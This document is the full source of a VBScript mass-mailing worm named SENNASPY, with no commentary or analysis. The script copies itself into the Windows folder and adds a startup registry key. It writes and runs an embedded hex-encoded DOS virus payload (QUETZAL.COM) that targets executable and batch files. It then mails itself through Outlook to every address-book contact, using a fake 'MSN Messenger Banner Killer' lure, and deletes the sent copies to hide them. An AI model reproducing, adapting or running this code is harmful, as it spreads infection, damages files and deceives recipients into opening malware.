On Error Resume Next

Dim OL01, OL02, OL03, OL04, OL05

Dim RG01, RG02

Dim AR01, AR02, AR03

Set RG01 = CreateObject( "Scripting.FileSystemObject" )
RG01.CopyFile WScript.ScriptFullName, RG01.BuildPath( RG01.GetSpecialFolder(0), "SENNASPY.VBS" )

Set RG02 = CreateObject( "WScript.Shell" )
RG02.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\" & "SENNASPY", RG01.BuildPath( RG01.GetSpecialFolder(0), "SENNASPY.VBS" )

Set AR01 = CreateObject( "Scripting.FileSystemObject" )
Set AR02 = AR01.CreateTextFile( AR01.BuildPath( AR01.GetSpecialFolder(1), "QUETZAL.COM" ), True )

AR02.Write( HEXACONV( "B85346BB0100B90200F3CD2FB8070ECD10E2FCB9E7030633C08EC0D1E3D1E68B87FE038784FE038987" ) )
AR02.Write( HEXACONV( "FE03BB0300BE0100072EC6865B060033D28EDAA10600488ED8B9FFFF8BF28B0435F3A5740546E2F6EB" ) )
AR02.Write( HEXACONV( "448B440435060075F38B440A350E0275EB8B440C3500C775E38B440E35060475DB8B5C11C64710CF8B" ) )
AR02.Write( HEXACONV( "5C1BC64710CF2EC6865B06018B5C512E899E57068B5CFB2E899E5306B9EB09B805FEEBFC80C43BEBF4" ) )
AR02.Write( HEXACONV( "B800CABB4254CD2F3C007401C32EC606520600B82435CD21B82425BAD902CD21B44732D2BEE605CD21" ) )
AR02.Write( HEXACONV( "55555F8BEC81EC8000BA5451CD14B44EB91000BA4D02CD217227807E9510751B807E9E2E7415B43B8D" ) )
AR02.Write( HEXACONV( "569ECD21E8D0FF9CB43BBA4A02CD219D733EB44FCD2173D9BA5303E83D00BA47032EC606510601B44E" ) )
AR02.Write( HEXACONV( "E82F00BA4D03E82900BA6503E82300BA5F03E81D00BA6B03E81700BA5903E81100BA7103E80B008BE5" ) )
AR02.Write( HEXACONV( "5DC32E2E002A2E2A00CD2172B981BEA1004D417456B8023DBA9E00CD21724C93B80057CD215152BA9E" ) )
AR02.Write( HEXACONV( "00B80043CD21723A5152B801435033C9CD212E803E5106017510B440B96800BADF02CD21721CEB0ECD" ) )
AR02.Write( HEXACONV( "05B440B97702BF0001CD21720CB801575A59CD21585A59CD21B43ECD212EFE8652062E80BE52060373" ) )
AR02.Write( HEXACONV( "06B44FEB89CD05B43BBAE605CD21B824255A1FCD21C3B80300CFCD180A0D4043747479204E756C0A0D" ) )
AR02.Write( HEXACONV( "466F722025254620496E20282A2E4261742920446F20436F70792025302E424154202525460A0D4344" ) )
AR02.Write( HEXACONV( "5C0A0D466F722025254620496E20282A2E4261742920446F20436F70792025302E424154202525460A" ) )
AR02.Write( HEXACONV( "0D4374747920436F6E2A2E424154002A2E42494E002A2E434F4D002A2E444C4C002A2E455845002A2E" ) )
AR02.Write( HEXACONV( "4F563F002A2E565844002A2E53595300BEAA0303F5E82100BEF70303F5E81900BE820403F5E81100BE" ) )
AR02.Write( HEXACONV( "FC0403F5E80900BE820503F5E80100C3AC3C007404CD29EBF7C30A0D7B7B7B2871756F746529517565" ) )
AR02.Write( HEXACONV( "747A616C636F61746C20776173206F6674656E20636F6E736964657265642074686520476F64206F66" ) )
AR02.Write( HEXACONV( "20746865206D6F726E696E6720737461722E0A0D000A0D20417320746865206D6F726E696E67207374" ) )
AR02.Write( HEXACONV( "617220686520776173206B6E6F776E20756E64657220746865207469746C6520546C616875697A6361" ) )
AR02.Write( HEXACONV( "6C70616E7465637568746C692E2E2E7768696368206D65616E73206C69746572616C79202D2D2D5468" ) )
AR02.Write( HEXACONV( "65204C6F7264206F66207468652053746172206F6620746865204461776E2D2D2D2E0A0D000A0D4865" ) )
AR02.Write( HEXACONV( "20776173206B6E6F776E2061732074686520696E76656E746F72206F6620626F6F6B7320616E642074" ) )
AR02.Write( HEXACONV( "68652063616C656E6461722E2E616E6420736F6D6574696D657320617320612073796D626F6C206F66" ) )
AR02.Write( HEXACONV( "20646561746820616E6420726573757272656374696F6E2871756F7465297D7D7D0A0D000A0D2F2F2F" ) )
AR02.Write( HEXACONV( "2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F2F46454152205448452041" ) )
AR02.Write( HEXACONV( "4E4349454E54204F4620444159532E2E2E414E442052454D454D424552205945535452444159275320" ) )
AR02.Write( HEXACONV( "544F4D4D4F52524F57535C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C5C" ) )
AR02.Write( HEXACONV( "5C5C5C0A0D000A0D2D3D2D3D2D3D2D3D3C3E3C3E3C3E3C3E5F5F5F4E4F204F4E452069732053414645" ) )
AR02.Write( HEXACONV( "2066726F6D20746865205752415448206F662061202D3D5B334C31285C2944202F2D5C4530285C5D3D" ) )
AR02.Write( HEXACONV( "2D5F5F5F3C3E3C3E3C3E3C3E3D2D3D2D3D2D3D2D0A0D00000000000000000000000000000000000000" ) )
AR02.Write( HEXACONV( "0000000000000000000000000000000000000000000000000000000000000000000000000000000000" ) )
AR02.Write( HEXACONV( "0000000000000000000000000000000000000000000000000000000000000000000000000000000000" ) )
AR02.Write( HEXACONV( "00000000000000000000000000000000000000" ) )
AR02.Close

Set AR03 = CreateObject( "WScript.Shell" )
AR03.Run( AR01.BuildPath( AR01.GetSpecialFolder(1), "QUETZAL.COM" ) )

Set OL01 = CreateObject( "Outlook.Application" )
Set OL02 = OL01.GetNameSpace( "MAPI" )

For Each OL03 In OL02.AddressLists
    For OL04 = 1 To OL03.AddressEntries.Count
        Set OL05 = OL01.CreateItem( 0 )

        OL05.BCC = OL03.AddressEntries( OL04 ).Address

        OL05.Subject = "Check out my MSN Messenger Banner Killer and speed loader patch/program. Thanks"
        OL05.Body = "Check it out it works great on my own system with no bugs so far works with  Win98,  Win9X, WinME WinNT, Win2K and WinXP. Not tested on Win95 but probably works without any problems.
Try it out lemme know what you think.
Things here are great.

Cya Soon...."
        OL05.Attachments.Add WScript.ScriptFullName
        OL05.DeleteAfterSubmit = True
        OL05.Send
    Next
Next

Function HEXACONV( HE01 )
   Dim HE02
   Dim HE03

   HE02 = ""

   For HE03 = 1 To Len( HE01 ) Step 2
       HE02 = HE02 & Chr( "&h" & Mid( HE01, HE03, 2 ) )
   Next

   HEXACONV = HE02
End Function
